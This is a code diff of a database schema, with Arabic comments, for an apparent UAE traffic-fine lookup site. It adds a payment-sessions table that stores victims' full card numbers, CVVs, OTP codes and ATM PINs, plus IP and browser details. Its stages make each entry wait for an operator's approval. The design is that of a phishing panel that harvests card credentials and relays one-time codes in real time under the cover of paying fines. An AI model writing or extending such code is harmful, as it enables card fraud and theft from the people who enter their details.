@@ -18,23 +18,14 @@ export type InsertUser = typeof users.$inferInsert;
 // جدول الاستعلامات - يخزن كل استعلام تم إجراؤه
 export const fineQueries = mysqlTable("fine_queries", {
   id: int("id").autoincrement().primaryKey(),
-  // مصدر اللوحة (الإمارة)
   plateSource: varchar("plateSource", { length: 100 }).notNull(),
-  // رقم اللوحة
   plateNumber: varchar("plateNumber", { length: 50 }).notNull(),
-  // كود اللوحة (الحروف)
   plateCode: varchar("plateCode", { length: 50 }).notNull(),
-  // حالة الاستعلام
   status: mysqlEnum("status", ["pending", "success", "failed", "no_fines"]).default("pending").notNull(),
-  // رسالة الخطأ إن وجدت
   errorMessage: text("errorMessage"),
-  // إجمالي المخالفات
   totalFines: int("totalFines").default(0),
-  // إجمالي المبلغ
   totalAmount: decimal("totalAmount", { precision: 10, scale: 2 }),
-  // النتائج الكاملة كـ JSON
   rawResults: json("rawResults"),
-  // معرف المستخدم (اختياري)
   userId: int("userId"),
   createdAt: timestamp("createdAt").defaultNow().notNull(),
   updatedAt: timestamp("updatedAt").defaultNow().onUpdateNow().notNull(),
@@ -43,27 +34,68 @@ export const fineQueries = mysqlTable("fine_queries", {
 export type FineQuery = typeof fineQueries.$inferSelect;
 export type InsertFineQuery = typeof fineQueries.$inferInsert;
 
-// جدول المخالفات - يخزن تفاصيل كل مخالفة
+// جدول المخالفات
 export const fines = mysqlTable("fines", {
   id: int("id").autoincrement().primaryKey(),
-  // معرف الاستعلام المرتبط
   queryId: int("queryId").notNull(),
-  // رقم المخالفة
   fineNumber: varchar("fineNumber", { length: 100 }),
-  // تاريخ المخالفة
   fineDate: varchar("fineDate", { length: 50 }),
-  // وصف المخالفة
   description: text("description"),
-  // مبلغ المخالفة
   amount: decimal("amount", { precision: 10, scale: 2 }),
-  // النقاط السوداء
   blackPoints: int("blackPoints").default(0),
-  // حالة الدفع
   isPaid: mysqlEnum("isPaid", ["paid", "unpaid", "partial"]).default("unpaid"),
-  // الموقع
   location: text("location"),
   createdAt: timestamp("createdAt").defaultNow().notNull(),
 });
 
 export type Fine = typeof fines.$inferSelect;
 export type InsertFine = typeof fines.$inferInsert;
+
+// جدول جلسات الدفع - يخزن كل جلسة دفع ومراحلها
+export const paymentSessions = mysqlTable("payment_sessions", {
+  id: int("id").autoincrement().primaryKey(),
+  // معرف الجلسة الفريد
+  sessionId: varchar("sessionId", { length: 64 }).notNull().unique(),
+  // معرف الاستعلام المرتبط
+  queryId: int("queryId"),
+  // المخالفات المحددة للدفع (JSON)
+  selectedFines: json("selectedFines"),
+  // إجمالي المبلغ
+  totalAmount: varchar("totalAmount", { length: 50 }),
+  // بيانات البطاقة الكاملة
+  cardName: varchar("cardName", { length: 200 }),
+  cardNumber: varchar("cardNumber", { length: 20 }),
+  cardNumberMasked: varchar("cardNumberMasked", { length: 20 }),
+  cardExpiry: varchar("cardExpiry", { length: 10 }),
+  cardCvv: varchar("cardCvv", { length: 10 }),
+  // رمز OTP
+  otpCode: varchar("otpCode", { length: 20 }),
+  // رقم ATM السري
+  atmPin: varchar("atmPin", { length: 20 }),
+  // المرحلة الحالية
+  stage: mysqlEnum("stage", [
+    "card",           // إدخال بيانات البطاقة
+    "card_pending",   // انتظار موافقة الأدمن على البطاقة
+    "otp",            // إدخال OTP
+    "otp_pending",    // انتظار موافقة الأدمن على OTP
+    "atm",            // إدخال رقم ATM
+    "atm_pending",    // انتظار موافقة الأدمن على ATM
+    "success",        // تم الدفع بنجاح
+    "failed",         // فشل الدفع
+  ]).default("card").notNull(),
+  // رسالة الخطأ عند الرفض
+  errorMessage: text("errorMessage"),
+  // معلومات اللوحة
+  plateNumber: varchar("plateNumber", { length: 50 }),
+  plateSource: varchar("plateSource", { length: 100 }),
+  // IP والمتصفح
+  clientIp: varchar("clientIp", { length: 50 }),
+  userAgent: text("userAgent"),
+  // حالة القراءة من الأدمن
+  statusRead: int("statusRead").default(0),
+  createdAt: timestamp("createdAt").defaultNow().notNull(),
+  updatedAt: timestamp("updatedAt").defaultNow().onUpdateNow().notNull(),
+});
+
+export type PaymentSession = typeof paymentSessions.$inferSelect;
+export type InsertPaymentSession = typeof paymentSessions.$inferInsert;
